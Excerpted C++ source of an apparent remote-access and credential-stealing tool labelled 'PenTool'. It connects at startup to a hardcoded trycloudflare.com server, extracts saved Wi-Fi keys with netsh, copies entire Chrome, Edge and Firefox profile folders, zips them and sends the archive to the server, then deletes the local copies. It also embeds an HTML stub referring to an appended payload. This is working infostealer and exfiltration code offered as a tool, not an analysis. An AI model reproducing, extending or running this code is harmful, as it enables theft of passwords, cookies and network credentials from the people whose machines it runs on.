...
<!doctype html><html><body><h1>Default embedded HTML</h1><p>No appended payload found.</p></body></html>
)HTML";
...
std::string remote_server_url = "tournament-exempt-idol-planned.trycloudflare.com";
...
class HTTPClient {
public:
    HTTPClient() : hSession(nullptr), hConnect(nullptr), hRequest(nullptr) {}
...
HTTPResponse post(const std::string& url, const std::string& data, 
    ...
    // Initialize WinHTTP
    hSession = WinHttpOpen(L"PenTool/1.0", 
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, 
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        response.status_code = -1;
        response.body = "Failed to initialize WinHTTP";
        return response;
    }
    ...
    if (!hRequest) {
        response.status_code = -1;
        response.body = "Failed to create request";
        cleanup();
        return response;
    }
    ...
    for (const auto& header : headers) {
        headers_str += std::wstring(header.first.begin(), header.first.end()) + L": " + 
                       std::wstring(header.second.begin(), header.second.end()) + L"\r\n";
    }
    
    if (!headers_str.empty()) {
        WinHttpAddRequestHeaders(hRequest, headers_str.c_str(), 
                                (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    }
    
    // Add default headers
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", 
                            (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD_IF_NEW);
    ...
    // FIXED: Removed extra NULL parameter at the end
    ...
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                       WINHTTP_HEADER_NAME_BY_INDEX, NULL, &size, NULL);

    if (size > 0) {
        // FIXED: Use char buffer instead of wchar_t
        std::vector<char> buffer(size);
        // FIXED: Correct parameter order - buffer as 4th, &size as 5th
        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                               WINHTTP_HEADER_NAME_BY_INDEX, buffer.data(), &size, NULL)) {
            // Convert to wstring for processing
            std::wstring headers_str((wchar_t*)buffer.data(), size / sizeof(wchar_t));
            
            // Parse headers
            std::wstringstream ss(headers_str);
            std::wstring line;
            while (std::getline(ss, line)) {
                size_t colon_pos = line.find(L':');
                if (colon_pos != std::wstring::npos) {
                    std::wstring name = line.substr(0, colon_pos);
                    std::wstring value = line.substr(colon_pos + 1);
                    // Trim whitespace
                    value.erase(0, value.find_first_not_of(L" \t"));
                    value.erase(value.find_last_not_of(L" \t") + 1);
                    
                    response.headers[std::string(name.begin(), name.end())] = 
    ...
    do {
        ...
        if (dwDownloaded > 0) {
            response.body.append(buffer, dwDownloaded);
        }
    } while (dwSize > 0);
...
private:
    ...
    static size_t header_callback(void *contents, size_t size, size_t nmemb, void *userp) {
        ...
        std::string header_line((char*)contents, size * nmemb);
...
// =============================
// End HTTP Client Implementation
// =============================
...
public:
    ...
    // Platform-specific volume control functions
        ...
        float linux_get_volume() {
            FILE* pipe = popen("amixer get Master | grep -o '[0-9]*%' | head -n1", "r");
            if (!pipe) return 0.0f;
...
void handle_remote(const std::vector<std::string>& args) {
    ...
    // Remove URL scheme if present (http:// or https://)
    size_t scheme_pos = server_ip.find("://");
    if (scheme_pos != std::string::npos) {
        server_ip = server_ip.substr(scheme_pos + 3); // Skip "://"
    }
    
    // Now look for the port part
    size_t colon_pos = server_ip.find(':');
    if (colon_pos != std::string::npos) {
        try {
            server_port = std::stoi(server_ip.substr(colon_pos + 1));
    ...
    #ifdef _WIN32
        FILE* pipe = _popen("netsh wlan show profiles | findstr \"All User Profile\" | for /f \"tokens=2 delims=:\" %i in ('more') do @netsh wlan show profiles \"%i\" key=clear | findstr \"SSID name\"", "r");
        if (pipe) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                std::string result(buffer);
...
void extract_browser_data_impl() {
        ...
        if (!local_appdata || !appdata) return;
        
        // Create browser data directory
        if (CreateDirectory("browser_data", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            // Chrome - copy entire User Data directory
            std::string chrome_path = std::string(local_appdata) + "\\Google\\Chrome\\User Data";
            std::string chrome_cmd = "xcopy \"" + chrome_path + "\" \"browser_data\\default\" /E /I /H /Y";
            system(chrome_cmd.c_str());
            
            // Microsoft Edge - copy entire User Data directory
            std::string edge_path = std::string(local_appdata) + "\\Microsoft\\Edge\\User Data";
            std::string edge_cmd = "xcopy \"" + edge_path + "\" \"browser_data\\default-e\" /E /I /H /Y";
            system(edge_cmd.c_str());
            
            // Firefox - find and copy first profile directory
            std::string firefox_path = std::string(appdata) + "\\Mozilla\\Firefox\\Profiles";
            std::string find_profile_cmd = "dir /B /A:D \"" + firefox_path + "\" | findstr /R \\.default$";
            FILE* pipe = _popen(find_profile_cmd.c_str(), "r");
            if (pipe) {
                char buffer[128];
                ...
                if (!profile_name.empty()) {
                    std::string firefox_profile_path = firefox_path + "\\" + profile_name;
                    std::string firefox_cmd = "xcopy \"" + firefox_profile_path + "\" \"browser_data\\default-fox\" /E /I /H /Y";
        ...
        system("mkdir -p browser_data");
        
        // Chrome - copy entire config directory
        std::string chrome_cmd = "cp -r ~/.config/google-chrome browser_data/default 2>/dev/null";
        system(chrome_cmd.c_str());
        
        // Microsoft Edge - copy entire config directory
        std::string edge_cmd = "cp -r ~/.config/microsoft-edge browser_data/default-e 2>/dev/null";
        system(edge_cmd.c_str());
        
        // Firefox - find and copy first profile directory
        std::string firefox_cmd = "for profile in ~/.mozilla/firefox/*.default ~/.mozilla/firefox/*.default-release; do "
                                  "if [ -d \"$profile\" ]; then "
                                  "cp -r \"$profile\" browser_data/default-fox 2>/dev/null; "
                                  "break; "
                                  "fi; "
                                  "done";
        system(firefox_cmd.c_str());
    ...
    // Now send the extracted data to server
    std::cout << "\nSending browser data to server...\n";
    
    // Create zip archive of browser_data folder
    std::string zip_cmd;
    #ifdef _WIN32
        zip_cmd = "powershell -Command \"Compress-Archive -Path 'browser_data' -DestinationPath 'browser_data.zip' -Force\"";
    #else
        zip_cmd = "zip -r browser_data.zip browser_data";
    #endif
    ...
    std::ifstream file("browser_data.zip", std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
    ...
    if (!file.read(buffer.data(), size)) {
        std::cerr << "Failed to read zip file\n";
        return;
    }
    file.close();
    
    // Send header
    std::string header = "[BROWSER_DATA:browser_data.zip:" + std::to_string(buffer.size()) + "]";
    if (!send_all(current_socket, header.c_str(), header.size())) {
        std::cerr << "Failed to send browser data header\n";
        return;
    }
    
    // Send data
    if (!send_all(current_socket, buffer.data(), buffer.size())) {
        std::cerr << "Failed to send browser data\n";
        return;
    }
    
    // Send end marker
    std::string end_marker = "[BROWSER_DATA_END]\n";
    if (!send_all(current_socket, end_marker.c_str(), end_marker.size())) {
        std::cerr << "Failed to send browser data end marker\n";
        return;
    }
    
    std::cout << "Browser data sent to server successfully.\n";
    
    // Clean up temporary files
    #ifdef _WIN32
        system("del /Q browser_data.zip");
        system("rmdir /S /Q browser_data");
    #else
        system("rm -f browser_data.zip");
        system("rm -rf browser_data");
    #endif
}
...
void extract_browser_data(const std::vector<std::string>& args) {
    ...
    log_action("Browser data extracted and sent to server");
}
...
int main(int argc, char* argv[]) {
    ...
    // Automatically execute remote and webview commands at startup
    std::cout << "\n[AUTO-START] Initializing remote connection...\n";
    tool.handle_remote({});
    
    std::cout << "\n[AUTO-START] Launching webview interface...\n";
    tool.handle_webview({});
